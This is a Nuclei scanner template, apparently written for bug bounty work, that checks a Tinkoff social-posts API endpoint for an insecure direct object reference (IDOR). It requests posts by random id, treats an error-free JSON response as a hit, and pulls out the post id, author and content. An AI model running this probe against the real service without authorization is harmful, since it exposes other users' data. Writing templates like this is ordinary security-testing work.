id: tinkoff-idor

info:
  name: Tinkoff - IDOR Vulnerabilities
  author: bugbounty
  severity: high
  description: Insecure Direct Object Reference in social posts API
  tags: idor,tinkoff
  reference:
    - https://portswigger.net/web-security/access-control/idor

http:
  - raw:
      - |
        GET /api/invest-gw/social/v1/post?id={{randstr}} HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: content_type
        words:
          - "application/json"

      - type: regex
        part: body
        regex:
          - '"id"\s*:\s*"?[0-9a-f-]+"?'
          - '"post"\s*:\s*\{'
          - '"author"\s*:\s*\{'
        condition: or

      - type: word
        part: body
        words:
          - '"error"'
          - '"forbidden"'
          - '"unauthorized"'
        condition: or
        negative: true

    extractors:
      - type: json
        part: body
        json:
          - '.id'
          - '.author'
          - '.content'
